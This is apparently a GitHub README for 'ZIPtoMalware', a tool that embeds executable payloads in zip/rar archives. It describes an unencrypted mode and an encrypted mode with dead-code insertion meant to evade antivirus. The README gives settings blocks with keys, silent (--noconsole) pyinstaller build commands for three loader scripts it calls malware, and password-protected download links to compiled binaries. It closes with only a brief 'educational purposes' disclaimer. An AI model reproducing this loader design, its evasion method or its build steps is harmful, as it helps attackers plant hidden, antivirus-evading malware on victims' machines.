# ZIPtoMalware

&emsp; It embeds the executable file or payload inside the zip/rar file.
It can use two different methods. 
The first method embeds the executable or payload in the zip/rar file without any action. 
In this way, it can be triggered and run by documents in the compressed file or in the same folder.
The second method encrypts the executable file or payload
and it also uses the "garbage code insertion/dead-code insertion" method to prevent the payload from being caught by the antivirus at runtime.
Both methods do not damage the rar/zip file. It is not detected by users. 
However, the first method can be detected by the antivirus depending on the code embedded.


**Method 0 [Mode 0]**

&emsp; The Linux operating system decides whether the file can be run by looking at the first bytes.
The same is true for Windows.
However, as the Windows operating system evolved, it associated files with file extensions.
But the internal functions still work by looking at the first bytes of the files.
In this way, while files with extensions such as exe, dll do not normally work in many functions for security reasons, 
it is possible to run them only by changing or deleting the extensions.

&emsp; For example, it is possible to run the file from "cmd.exe" without looking at the file extension.

![w1](https://user-images.githubusercontent.com/71177413/170837554-2064a6d9-7b16-43d4-a70d-b2d3c8b9302b.png)

&emsp; Some attack methods can be made by taking advantage of the vulnerability of both the Windows operating system and the Winrar / Winzip / 7z (etc) program.
Executable/payload in Winrar/Winzip/7z (etc)) can be triggered by a file inside the Winrar/Winzip/7z (etc) or a file in the same folder.
In order to be easy to trigger, the payload does not require any encryption.
However, before adding malicious code to Winrar/Winzip/7z (etc), the attacker must take additional precautions such as "UPx" in order not to be caught by the antivirus.

![x6](https://user-images.githubusercontent.com/71177413/170820736-501fd8a6-5957-4cc1-8ecc-46e215e3a794.JPG)

<dl>
  <dt> "It is a very simple attack file that uses this method as an example."
  <dd>
  <dd> The VBA shell() function in Microsoft applications does not run files with malicious extensions such as exe, dll, and gives a virus warning. As an example of "ZERODAY ATTACK", these files can be run if their extensions are changed. Although there are dozens of similar vulnerabilities, one example is given below.
  <dd> example1.rar --> zip password: !0*ziP*+*RAr*9?
  <dd> Link = https://drive.google.com/file/d/167BmQSjKQcwTnlZSU--i7le3dup97JdV/view?usp=sharing
</dl>


[a,b,c,d]

![z1](https://user-images.githubusercontent.com/71177413/170821099-1c0e5a89-fdb3-45c7-a257-000157e77e60.png)


[a]

![x1](https://user-images.githubusercontent.com/71177413/170824262-03c5c053-0f2f-48a8-aba2-0195bcd6fc62.JPG)


[b]

![x2](https://user-images.githubusercontent.com/71177413/170824264-0181c11f-2a86-4a79-ae62-f1e7153a056f.JPG)


[c]

![x4](https://user-images.githubusercontent.com/71177413/170824300-55e3b747-6355-459c-b0ca-fd1f566db692.JPG)


[d]

![x5](https://user-images.githubusercontent.com/71177413/170824304-181f5285-e072-4863-9e86-893ac65139fe.JPG)


&emsp; It is a very simple but effective attack method.

**Method 1 [Mode 1]**

&emsp; This method encrypts the executable file or payload
and it also uses the "garbage code insertion/dead-code insertion" method to prevent the payload from being caught by the antivirus at runtime.
This method can be used both in the attack and after the attack to hide itself in a rar/zip file that exists in the system.


**File(s)**

&emsp;**1) InjectingMalwareIntoZIPRAR.py :** It is the script that embeds the payload into the zip/rar file.

&emsp;**2) malware_v1.py :** It is the script that extracts the malware in the existing zip/rar file by using "method 0" and runs it.

&emsp;**3) malware_v2.py :** It is the script that extracts the malware in the existing zip/rar file by using "method 1" and runs it. (After the script code is compiled, the values of the variables can be seen with the static analysis of the program.)

&emsp;**4) malware_v3.py :** It is the script that extracts the malware in the existing zip/rar file by using "method 1" and runs it. (After the script code is compiled, the values of the variables can be seen with dynamic analysis of the program.)


The Compiled Version of the Program Can be Downloaded from the Links Below.
---

![s1](https://user-images.githubusercontent.com/71177413/170823001-ca9ddddf-ce65-4b70-9bc5-0f1927e85152.JPG)


<dl>
  <dt> "Injecting Malware Into ZIP/RAR File"
  <dd>
  <dd> InjectingMalwareIntoZIPRAR.rar --> zip password: !0*ziP*+*RAr*9?
  <dd> Link = https://drive.google.com/file/d/1NWqwOCLKnxDvTxMCpMNbWxm9tiN0I4wL/view?usp=sharing
</dl>


<dl>
  <dt> "Malware V1"
  <dd>
  <dd> malware_v1.rar --> zip password: !0*ziP*+*RAr*9?
  <dd> Link = https://drive.google.com/file/d/1NyJDfFU7bGau127oZ-M6S1Q1bDUXFk5E/view?usp=sharing
</dl>

<dl>
  <dt> "Malware V2"
  <dd>
  <dd> malware_v2.rar --> zip password: !0*ziP*+*RAr*9?
  <dd> Link = https://drive.google.com/file/d/1SJc8QJ_92ABAwSkrRcLNz4IDRL8CdjxT/view?usp=sharing
</dl>

<dl>
  <dt> "Malware V3"
  <dd>
  <dd> malware_v3.rar --> zip password: !0*ziP*+*RAr*9?
  <dd> Link = https://drive.google.com/file/d/1MOvk0IKdkPzlDKLdSsJWLpxkQtLpYlKL/view?usp=sharing
</dl>

Requirements
---
Required libraries: colorama, pyinstaller

```
pip install colorama
pip install pyinstaller
```

"pyinstaller" will be used to make the code one piece executable


Settings
---

**InjectingMalwareIntoZIPRAR.py (Default Settings)**
```
class SETTINGS():
    PROGRAM_NAME      = "Injecting Malware Into Winzip/Winrar" # Program Name
    RAR_or_ZIP_FILE   = 'document.zip'                         # Zip/rar file name  # The variable is changed again during the program run.
    EXE_FILE          = "malware.exe"	                         # Malware file name  # The variable is changed again during the program run.		 									
    OUT_FILE          = "malware"                              # Out file name = OUT_FILE + "RAR/ZIP" + ".zip/.rar"
    MODE              = 0                                      # A variable value of 0 means an unencrypted injection; A variable value of 1 means an encrypted injection.
    PUPLIC_KEY        = b'!AbdUlkadiR%+39608]gunGor[{'         # Encryption key
    PRIVATE_NUMBER    = 19                                     # Encryption number
    BUFFER            = 1024                                   # Buffer for memory optimization
    FILL_SIZE         = 1073741824                             # 1024x1024x1024 (1 GB)
    WAIT_TIME         = 0.1                                    # Waiting time between processes
  ```
  
**malware_v1.py (Default Settings) [Mode 0]**
```
class SETTINGS():
    FILE = "malwareZIP.zip" # It can also be given as a parameter to the program #(Example)>>malware_v1.exe "malwareZIP.zip"
    WAIT_TIME  = 0.1        # Waiting time between processes
```

**malware_v2.py (Default Settings) [Mode 1]**
```
class SETTINGS():
    RAR_or_ZIP_FILE   = "malwareZIP.zip"        # It can also be given as a parameter to the program #(Example)>>malware_v2.exe "malwareZIP.zip"
    OUT_FILE = "malware_test.exe"               # Out file name   
    PUPLIC_KEY = b'!AbdUlkadiR%+39608]gunGor[{' # Encryption key
    PRIVATE_NUMBER = 19                         # Encryption number
    BUFFER     = 1024                           # Buffer for memory optimization   
    WAIT_TIME  = 0.1                            # Waiting time between processes
```

**malware_v3.py (Default Settings) [Mode 1]**
```
# Encrypted data for static analysis
# However, variables can be resolved with dynamic analysis.
class SETTINGS():
    ENTRY             = False
    KEY               = b"i*^2AcFeq19?8l&%r+Tm]|[ojB,TEx$.R"
    RAR_or_ZIP_FILE   = b'\x1cZ\x12L\x1f\x15\x1ao*/\x18<\x1bv' ###(Example) cmd>>malware_v2 "malwareZIP.zip"
    OUT_FILE = b'3(Z\x03UE$\x0eYf;)\x0b\r60'
    PUPLIC_KEY = b'geaP9\x0fA0x\x03y\x04>\nb\rBF2.\x1b\x0b/]7f\x11'
    PRIVATE_NUMBER = b'\x13x'
    BUFFER     = 1024
    WAIT_TIME  = 0.1
```

Compilation
---
[Language : Python 3.8.5]
```
# [Program that produces zip/rar with malware]
pyinstaller --onefile --icon=InjectingMalwareIntoZIPRAR.ico InjectingMalwareIntoZIPRAR.py

# [Malware(s)]
pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v1.py
pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v2.py
pyinstaller --onefile  --noconsole  --icon=malware.ico  malware_v3.py
```

Some Screenshot of the Working of the Program
---


**Screenshot [1] (InjectingMalwareIntoZIPRAR.exe) [(Method 0)->Mode 0]**
![s3](https://user-images.githubusercontent.com/71177413/170823482-053e8418-754e-4a67-a2e6-2bc34475c3f7.JPG)
  
 
**Screenshot [2] (InjectingMalwareIntoZIPRAR.exe) [(Method 1)->Mode 1]**
![s5](https://user-images.githubusercontent.com/71177413/170823503-75d45b6a-371e-4ce5-aa31-b0b0f81acb2f.JPG)


**Screenshot [3] (malware_v1.exe) [(Method 0)->Mode 0]**

Triggering malware from cmd.exe

![s7](https://user-images.githubusercontent.com/71177413/170823628-7f6ec56b-2893-40a4-b334-baaaa17d3d4c.JPG)


**Screenshot [4] (malware_v1.exe) [(Method 0)->Mode 0]**

![S8](https://user-images.githubusercontent.com/71177413/170823734-24a4b5ee-80bb-4f4e-9ebf-0aa0d118d3b8.JPG)


**Screenshot [5] (malware_v2.exe) [(Method 1)->Mode 1]**

![S9](https://user-images.githubusercontent.com/71177413/170823790-8524f98b-92b0-48b3-93df-92dcf4a77460.JPG)


**Screenshot [6] (malware_v2.exe) [(Method 1)->Mode 1]**

![S10](https://user-images.githubusercontent.com/71177413/170823804-fe956b0b-992c-4b1e-9e76-a7c135c42067.JPG)


**Screenshot [7] (malware_v3.exe) [(Method 1)->Mode 1]**

![s11](https://user-images.githubusercontent.com/71177413/170823829-d2766f89-18cf-4c63-90a7-9978740e6864.JPG)


**Screenshot [8] (malware_v3.exe) [(Method 1)->Mode 1]**

![s12](https://user-images.githubusercontent.com/71177413/170823837-9fc798c4-a0fb-4f24-b4e2-cebc9b4fc53c.JPG)


Legal Warning
---
&emsp; Run your tests on virtual machines. The responsibility for illegal use belongs to the user. Shared for educational purposes.
